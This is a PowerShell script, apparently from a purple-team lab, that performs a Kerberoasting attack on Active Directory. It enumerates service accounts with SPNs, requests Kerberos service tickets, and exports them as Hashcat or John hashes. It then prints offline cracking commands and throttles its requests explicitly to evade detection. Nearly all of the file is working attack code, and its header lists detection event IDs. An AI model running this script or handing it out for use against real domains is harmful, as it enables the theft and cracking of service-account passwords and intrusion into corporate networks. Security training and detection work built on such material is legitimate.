<#
.SYNOPSIS
    Kerberoasting Attack Implementation (MITRE ATT&CK: T1558.003)

.DESCRIPTION
    This script demonstrates the Kerberoasting attack technique against Active Directory.
    Kerberoasting exploits the Kerberos authentication protocol by requesting service
    tickets (TGS) for accounts with Service Principal Names (SPNs), then extracting
    and cracking these tickets offline to reveal plaintext passwords.

    Attack Flow:
    1. Enumerate domain accounts with SPNs set
    2. Request Kerberos TGS tickets for each SPN
    3. Extract tickets from memory
    4. Export tickets in crackable format (Hashcat/John)
    5. Offline password cracking

.NOTES
    Author: Purple Team Lab
    MITRE ATT&CK: T1558.003 - Kerberoasting
    Date: 2024-01-14

    Prerequisites:
    - Domain-joined Windows system OR network access to DC
    - Valid domain user credentials (even low-privilege)
    - PowerShell 3.0+

    Detection Indicators:
    - Event ID 4769 (Kerberos Service Ticket Request)
    - Event ID 4770 (Kerberos Service Ticket Renewal)
    - Unusual encryption types (RC4 vs AES)
    - High volume of TGS requests from single user
    - TGS requests for accounts the user doesn't typically access

.PARAMETER OutputPath
    Directory to save extracted Kerberos tickets

.PARAMETER TargetSPN
    Specific SPN to target (optional, defaults to all SPNs)

.PARAMETER ExportFormat
    Format for exported hashes: Hashcat or John (default: Hashcat)

.EXAMPLE
    .\kerberoasting.ps1
    Performs full Kerberoasting attack on all discovered SPNs

.EXAMPLE
    .\kerberoasting.ps1 -TargetSPN "MSSQLSvc/sql01.purpleteam.lab:1433"
    Targets specific SQL Server service account

.EXAMPLE
    .\kerberoasting.ps1 -OutputPath "C:\Temp\tickets" -ExportFormat John
    Exports tickets to specified path in John the Ripper format

.LINK
    https://attack.mitre.org/techniques/T1558/003/
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$OutputPath = "$PWD\kerberoast_output",

    [Parameter(Mandatory=$false)]
    [string]$TargetSPN,

    [Parameter(Mandatory=$false)]
    [ValidateSet('Hashcat', 'John')]
    [string]$ExportFormat = 'Hashcat'
)

# Error handling and logging
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

# Create output directory
if (-not (Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
}

$LogFile = Join-Path $OutputPath "kerberoast_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
$TicketFile = Join-Path $OutputPath "tickets_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogMessage = "[$Timestamp] [$Level] $Message"
    Write-Host $LogMessage
    Add-Content -Path $LogFile -Value $LogMessage
}

function Get-DomainSPNAccounts {
    <#
    .SYNOPSIS
        Enumerate all domain accounts with Service Principal Names (SPNs)
    #>

    Write-Log "Enumerating domain accounts with SPNs..." "INFO"

    try {
        # Using .NET DirectorySearcher for stealth (no PowerView needed)
        $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $DomainDN = ($Domain.GetDirectoryEntry()).distinguishedName
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = "LDAP://$DomainDN"

        # LDAP filter for accounts with SPNs (excluding computer accounts)
        $Searcher.Filter = "(&(servicePrincipalName=*)(objectCategory=person)(objectClass=user))"
        $Searcher.PropertiesToLoad.AddRange(@('samaccountname', 'serviceprincipalname', 'distinguishedname', 'pwdlastset'))

        $Results = $Searcher.FindAll()

        $SPNAccounts = @()
        foreach ($Result in $Results) {
            $Account = $Result.Properties
            $SPNs = $Account['serviceprincipalname']

            foreach ($SPN in $SPNs) {
                $SPNAccounts += [PSCustomObject]@{
                    SamAccountName = $Account['samaccountname'][0]
                    SPN = $SPN
                    DistinguishedName = $Account['distinguishedname'][0]
                    PasswordLastSet = [DateTime]::FromFileTime($Account['pwdlastset'][0])
                }
            }
        }

        Write-Log "Found $($SPNAccounts.Count) SPNs across $($Results.Count) accounts" "SUCCESS"
        return $SPNAccounts

    } catch {
        Write-Log "Error enumerating SPNs: $_" "ERROR"
        throw
    }
}

function Request-KerberosTGS {
    <#
    .SYNOPSIS
        Request Kerberos TGS ticket for specified SPN
    #>

    param(
        [Parameter(Mandatory=$true)]
        [string]$SPN
    )

    try {
        Write-Log "Requesting TGS for SPN: $SPN" "INFO"

        # Request TGS ticket using Add-Type and .NET Kerberos classes
        Add-Type -AssemblyName System.IdentityModel

        # Create new Kerberos ticket request
        $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN

        Write-Log "TGS ticket obtained for: $SPN" "SUCCESS"
        return $Ticket

    } catch {
        Write-Log "Failed to request TGS for ${SPN}: $_" "ERROR"
        return $null
    }
}

function Export-KerberosTicket {
    <#
    .SYNOPSIS
        Extract and export Kerberos ticket from memory in crackable format
    #>

    param(
        [Parameter(Mandatory=$true)]
        $Ticket,

        [Parameter(Mandatory=$true)]
        [string]$SamAccountName
    )

    try {
        # Get ticket from cache
        $TicketByteStream = $Ticket.GetRequest()

        if ($null -eq $TicketByteStream) {
            Write-Log "Failed to extract ticket bytes for $SamAccountName" "ERROR"
            return
        }

        # Convert to hex string
        $TicketHex = [System.BitConverter]::ToString($TicketByteStream) -replace '-', ''

        # Extract the encrypted portion (RC4 or AES)
        # For Hashcat format: $krb5tgs$23$*user$realm$spn*$hash

        if ($ExportFormat -eq 'Hashcat') {
            # Hashcat Kerberos 5 TGS-REP format
            $Hash = "`$krb5tgs`$23`$*$SamAccountName`$PURPLETEAM.LAB`$$($Ticket.ServicePrincipalName)*`$$TicketHex"
        } else {
            # John the Ripper format
            $Hash = "`$krb5tgs`$$SamAccountName`$PURPLETEAM.LAB`$$TicketHex"
        }

        # Save to file
        Add-Content -Path $TicketFile -Value $Hash
        Write-Log "Ticket exported for: $SamAccountName" "SUCCESS"

        return $Hash

    } catch {
        Write-Log "Error exporting ticket for ${SamAccountName}: $_" "ERROR"
        return $null
    }
}

function Invoke-OfflineCracking {
    <#
    .SYNOPSIS
        Provide instructions for offline password cracking
    #>

    param(
        [Parameter(Mandatory=$true)]
        [string]$TicketFilePath
    )

    Write-Log "`n===== OFFLINE CRACKING INSTRUCTIONS =====" "INFO"
    Write-Log "Tickets saved to: $TicketFilePath" "INFO"

    if ($ExportFormat -eq 'Hashcat') {
        Write-Log "`nHashcat command:" "INFO"
        Write-Log "hashcat -m 13100 $TicketFilePath /path/to/wordlist.txt --force" "INFO"
        Write-Log "`nExample with rockyou.txt:" "INFO"
        Write-Log "hashcat -m 13100 $TicketFilePath /usr/share/wordlists/rockyou.txt -o cracked.txt --force" "INFO"
    } else {
        Write-Log "`nJohn the Ripper command:" "INFO"
        Write-Log "john --format=krb5tgs $TicketFilePath --wordlist=/path/to/wordlist.txt" "INFO"
    }

    Write-Log "`nMode 13100 = Kerberos 5 TGS-REP etype 23 (RC4-HMAC)" "INFO"
    Write-Log "========================================`n" "INFO"
}

################################################################################
# Main Execution
################################################################################

Write-Log "===== KERBEROASTING ATTACK INITIATED =====" "INFO"
Write-Log "MITRE ATT&CK Technique: T1558.003" "INFO"
Write-Log "Output Directory: $OutputPath" "INFO"
Write-Log "Export Format: $ExportFormat" "INFO"

try {
    # Step 1: Enumerate SPNs
    $SPNAccounts = Get-DomainSPNAccounts

    if ($SPNAccounts.Count -eq 0) {
        Write-Log "No SPN accounts found in domain" "WARNING"
        exit 0
    }

    # Display discovered SPNs
    Write-Log "`nDiscovered SPNs:" "INFO"
    $SPNAccounts | Format-Table -AutoSize | Out-String | Write-Log

    # Step 2: Filter target if specified
    if ($TargetSPN) {
        $SPNAccounts = $SPNAccounts | Where-Object { $_.SPN -eq $TargetSPN }
        Write-Log "Filtered to target SPN: $TargetSPN" "INFO"
    }

    # Step 3: Request TGS tickets
    $SuccessCount = 0
    foreach ($Account in $SPNAccounts) {
        $Ticket = Request-KerberosTGS -SPN $Account.SPN

        if ($Ticket) {
            $Hash = Export-KerberosTicket -Ticket $Ticket -SamAccountName $Account.SamAccountName
            if ($Hash) {
                $SuccessCount++
            }
        }

        # Small delay to avoid detection (throttling)
        Start-Sleep -Milliseconds 500
    }

    # Step 4: Summary
    Write-Log "`n===== ATTACK SUMMARY =====" "INFO"
    Write-Log "Total SPNs discovered: $($SPNAccounts.Count)" "INFO"
    Write-Log "Tickets successfully extracted: $SuccessCount" "SUCCESS"
    Write-Log "Tickets saved to: $TicketFile" "INFO"

    # Step 5: Cracking instructions
    if ($SuccessCount -gt 0) {
        Invoke-OfflineCracking -TicketFilePath $TicketFile
    }

    Write-Log "`n===== KERBEROASTING ATTACK COMPLETE =====" "SUCCESS"

    # Return results for automation
    return [PSCustomObject]@{
        SPNsFound = $SPNAccounts.Count
        TicketsExtracted = $SuccessCount
        OutputFile = $TicketFile
        LogFile = $LogFile
    }

} catch {
    Write-Log "Fatal error during Kerberoasting attack: $_" "ERROR"
    throw
}
